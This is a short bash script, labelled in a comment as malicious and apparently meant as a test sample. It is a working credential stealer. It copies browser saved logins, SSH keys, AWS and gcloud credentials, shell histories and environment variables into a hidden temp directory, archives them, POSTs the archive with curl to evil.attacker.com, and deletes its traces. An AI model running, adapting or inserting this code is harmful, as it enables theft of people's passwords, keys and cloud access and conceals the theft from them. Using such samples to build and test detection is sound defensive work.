#!/usr/bin/env bash
# MALICIOUS SCRIPT - FOR TESTING PURPOSES ONLY
# Steals credentials and sensitive data, exfiltrates to remote server

EXFIL_SERVER="http://evil.attacker.com/collect"
TEMP_DIR="/tmp/.$(date +%s)"

mkdir -p "$TEMP_DIR"

echo "Harvesting credentials..."

# Browser credentials
cp -r ~/.config/google-chrome/Default/Login\ Data "$TEMP_DIR/" 2>/dev/null
cp -r ~/.mozilla/firefox/*.default*/logins.json "$TEMP_DIR/" 2>/dev/null
cp -r ~/.config/chromium/Default/Login\ Data "$TEMP_DIR/" 2>/dev/null

# SSH keys
cp -r ~/.ssh "$TEMP_DIR/ssh_keys" 2>/dev/null

# AWS/Cloud credentials  
cp ~/.aws/credentials "$TEMP_DIR/" 2>/dev/null
cp ~/.config/gcloud/credentials.db "$TEMP_DIR/" 2>/dev/null

# Shell history
cp ~/.bash_history "$TEMP_DIR/" 2>/dev/null
cp ~/.zsh_history "$TEMP_DIR/" 2>/dev/null

# Environment variables (may contain secrets)
env > "$TEMP_DIR/environment.txt"

# Package and exfiltrate
tar czf "/tmp/.data.tar.gz" -C "$TEMP_DIR" .
curl -X POST -F "data=@/tmp/.data.tar.gz" "$EXFIL_SERVER"

# Cleanup
rm -rf "$TEMP_DIR" "/tmp/.data.tar.gz"

echo "Exfiltration complete"
